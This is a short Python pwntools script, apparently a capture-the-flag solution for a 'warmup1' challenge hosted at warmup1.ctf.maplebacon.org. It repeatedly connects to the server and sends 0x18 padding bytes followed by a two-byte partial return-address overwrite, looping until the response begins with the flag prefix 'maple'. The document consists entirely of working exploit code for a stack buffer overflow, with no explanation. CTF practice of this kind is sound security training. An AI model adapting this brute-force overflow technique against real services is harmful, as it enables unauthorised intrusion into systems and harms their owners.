from pwn import *

output = ""

while output.startswith("maple") != True:
	p = remote("warmup1.ctf.maplebacon.org", 1337)

	p.send(b'A' * 0x18 + b"\x19\x12")
	output = p.recvline().decode()

print(output)